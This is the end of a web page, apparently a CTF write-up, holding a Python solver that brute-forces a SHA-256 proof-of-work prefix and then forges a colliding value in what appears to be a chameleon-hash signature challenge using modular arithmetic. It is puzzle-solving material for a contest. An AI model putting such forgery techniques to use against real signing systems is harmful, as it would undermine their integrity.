    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dest<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
                <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
                    s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    s<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>dest<span class="token operator">+</span>buf1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
                    <span class="token comment"># print(dest)</span>
                    <span class="token keyword">if</span> s<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>buf2<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;success&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hexStr_to_str</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">hex</span> <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    str_bin <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> str_bin<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">int2str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&quot;big&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">&quot;little&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> _<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">&quot;big&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> _<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_parameter</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> int2str<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    a <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">&quot;\0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    h <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> b<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token comment"># print(x)</span>
    <span class="token comment"># print(b)</span>
    <span class="token comment"># return x,b</span>
    <span class="token keyword">return</span> y<span class="token punctuation">,</span>h<span class="token punctuation">,</span>b<span class="token punctuation">,</span>x


<span class="token comment"># calc(&quot;ToMwVWGrFt6lq87d&quot;,&quot;4a4f3f3e8c9dbc912e51bf662f511af913fad26587c0bbb2860ab9a8f1de08ec&quot;)</span>

m1<span class="token operator">=</span><span class="token string">&quot;6851366d3844465e763b69674231212230405e5d605773796538286a4b6d24683c7a257c2c6f3a7b5e452d3e276e594b2c7222443d552e5c6c4b37775626262f&quot;</span>
m2<span class="token operator">=</span><span class="token string">&quot;4c436e47243a5b5044763a4d23613c426e3b4a22734a3d2927472c516b226f5f33553c3e4b7143535e4b257c564b4f3d544c41637628694250716d577e613d5e&quot;</span>
r1<span class="token operator">=</span><span class="token number">13307157911474497325257929676036948733445379516133193902363508307807244520530420462894958525330581772479724484043351068294357383114453924547068394433943751</span>
y1<span class="token punctuation">,</span>h1<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>x1<span class="token operator">=</span>get_parameter<span class="token punctuation">(</span>hexStr_to_str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span>
y2<span class="token punctuation">,</span>h2<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>x2<span class="token operator">=</span>get_parameter<span class="token punctuation">(</span>hexStr_to_str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span>


b<span class="token operator">=</span><span class="token punctuation">(</span>r1<span class="token operator">*</span>b1<span class="token operator">+</span>x1<span class="token operator">-</span>x2<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>b2
m<span class="token operator">=</span><span class="token number">12039102490128509125925019010000012423515617235219127649182470182570195018265927222</span>
phi_m<span class="token operator">=</span><span class="token number">3438486168439863199139442674478708048513091438880592029152171119773032205130254400</span>
<span class="token comment"># print(a,b,m)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>

r2<span class="token operator">=</span>b<span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>phi_m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;r2=&quot;</span><span class="token punctuation">,</span>r2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r2<span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;s1=&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span>y1 <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span> r1<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;s2=&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span>y2 <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>h2<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br></div></div><p><img src="/assets/img/4hou1.d522b9a2.png" alt=""></p> <p><img src="/assets/img/4hou2.1fed6d04.png" alt=""></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/5.175964b3.js" defer></script>
  </body>
</html>
